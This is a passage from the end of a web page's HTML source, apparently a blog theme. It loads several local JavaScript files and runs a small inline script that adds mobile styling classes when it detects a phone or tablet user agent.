src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>